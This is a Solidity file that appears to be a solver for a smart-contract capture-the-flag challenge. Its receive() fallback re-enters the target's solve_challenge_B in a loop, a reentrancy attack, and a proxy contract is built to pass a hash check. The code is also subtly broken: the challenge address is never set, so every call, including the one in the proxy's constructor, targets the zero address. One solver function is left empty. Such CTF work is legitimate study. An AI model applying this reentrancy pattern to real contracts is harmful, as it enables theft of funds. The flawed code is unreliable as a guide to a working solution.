// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {GUILD_AUDIT_CHALLENGE} from "../task-two/ctf-challenge/challenge.sol";
import {S_M} from "../task-two/ctf-challenge/secret_missive.sol";

contract Solution {
    GUILD_AUDIT_CHALLENGE public challenge;
    uint count;

    function solve_challenge_A(address txo) public payable {
        bytes32 c = keccak256(abi.encode("0x44\\0x33\\0x22\\0x11\\0x00", txo));
        challenge.solve_challenge_A{value: msg.value}(c);
    }

    function solve_challenge_B() public {
        challenge.solve_challenge_B();
    }

    function solve_challenge_C(address _newPrincipal) public {
        challenge.solve_challenge_C(_newPrincipal);
    }

    function get_C_Profit() public {
        challenge.get_C_Profit();
    }

    function solve_challenge_D2() public {}

    receive() external payable {
        // require(count == uint8(uint256(keccak256("solved"))) % 15);
        if (count < uint8(uint256(keccak256("solved"))) % 15) {
            solve_challenge_B();
            count++;
        } else if (count == uint8(uint256(keccak256("solved"))) % 15) {
            revert("Already solved");
        }
    }
}

contract MyProxy is S_M {
    GUILD_AUDIT_CHALLENGE public challenge;

    constructor() {
        challenge.solve_challenge_D(address(this));
    }

    function solve_challenge_D2() public {
        challenge.solve_challenge_D2();
    }

    function __expected__() external view returns (MSS_SS_SSM memory m) {
        m.__boom__ = uint16(
            bytes2(bytes16(keccak256(abi.encode(address(this)))))
        );
    }
}
